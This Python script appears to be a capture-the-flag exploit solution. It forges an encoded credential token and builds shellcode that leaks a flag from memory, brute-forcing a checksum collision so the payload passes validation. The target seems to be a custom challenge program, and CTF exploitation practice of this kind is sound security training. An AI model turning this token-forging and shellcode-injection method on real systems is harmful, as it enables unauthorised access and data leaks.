from __future__ import print_function
OFFSET = 48

def base64enc(arr):
  ret = []
  if type(arr) is str:
    for ch in arr:
      el = ord(ch)
      ret.append(chr((el & 63) + OFFSET))
      ret.append(chr(((el >> 6) & 63) + OFFSET))
      ret.append(chr(((el >> 12) & 15) + OFFSET))
  else:
    for el in arr:
      ret.append(chr((el & 63) + OFFSET))
      ret.append(chr(((el >> 6) & 63) + OFFSET))
      ret.append(chr(((el >> 12) & 15) + OFFSET))
  return "".join(ret)

def base64dec(arr):
  ret = []
  for i in range(0, len(arr), 3):
    ret.append((ord(arr[i]) - OFFSET)
      | ((ord(arr[i + 1]) - OFFSET) << 6)
      | ((ord(arr[i + 2]) - OFFSET) << 12))
  return ret

def cksum(data):
    cks1 = 0
    cks2 = 0
    for dp in data:
        cks1 += dp;
        cks2 += cks1 + ((dp & 0xFF00)>>8);
    cks1 &= 0xFF;
    cks2 &= 0xFF;
    return (cks1 << 8) | cks2;

def unswizzle(data):
    unswiz = []
    for dp in data:
        val = 0
        val |= (dp & 0b0000000000000011) << 14 # 0 <- 7
        val |= (dp & 0b1100000000000000) >> 2  # 1 <- 0
        val |= (dp & 0b0000001100000000) << 2  # 2 <- 3
        val |= (dp & 0b0011000000000000) >> 4  # 3 <- 1
        val |= (dp & 0b0000110000000000) >> 4  # 4 <- 2
        val |= (dp & 0b0000000000001100) << 2  # 5 <- 6 
        val |= (dp & 0b0000000011000000) >> 4  # 6 <- 4
        val |= (dp & 0b0000000000110000) >> 4  # 7 <- 5
        unswiz.append(val)
    return unswiz


def encode(name, secret, idx):
    name = name.ljust(16)
    assert len(name) == 16
    secret = secret.ljust(8)
    assert len(secret) == 8
    arg = map(ord, name) + map(ord, secret) + [idx]
    return encode_raw(arg)

def encode_raw(arg):
    cks = cksum(arg)  # need to cks before swizzle
    arg = unswizzle(arg)
    return base64enc([cks] + arg)

from itertools import product
def find_cksum_for(val, suffix):
    suf_l = len(suffix)
    fill_l = 25 - suf_l
    alphabet = [ord('A')] + range(256) # 'A' first so it'll prioritize that, easier to see if we have an offset wrong when writing exploits
    jjj = [alphabet] * fill_l
    for t in product(*jjj):
        attempt = t + suffix
        if cksum(attempt) == val:
            return attempt
    
flag2_len = 0x20 # leak a bunch of extra memory, flag will still be at the beginning
flag2_loc = 0x164F
jmp = 0
println = 0x103D
mi_s00 = 0x0040
mi_s01 = 0x0041

def part_1():
    return encode('President Skroob', '12345', 12)

def part_2():
    shellcode = (mi_s00, flag2_loc, mi_s01, flag2_len, jmp, println, 0, 0, 0b1111,)
    shc_loc = 0x14C0
    col = find_cksum_for(shc_loc, shellcode)
    return encode_raw(list(col))

print('Part 1: ', part_1())
print('Part 2: ', part_2())
